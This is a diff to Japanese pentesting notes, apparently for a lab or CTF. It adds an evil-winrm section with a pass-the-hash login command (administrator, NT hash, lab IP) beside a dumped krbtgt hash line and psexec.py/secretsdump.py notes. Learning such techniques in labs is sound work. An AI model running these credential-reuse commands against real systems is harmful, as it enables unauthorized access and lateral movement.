@@ -1966,8 +1966,24 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
 
 ```
 
+### evil-winrm
+
+[公式](https://github.com/Hackplayers/evil-winrm)
+
+
+```
+evil-winrm -i 10.10.186.130 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+i: ip
+u: user
+H: nt hash
+
+```
+
 
 ### psexec.py
+
+evil-winrm の代替手段。
 
 secretsdump.pyで得られたhashを用いて、remote execution を行う
 
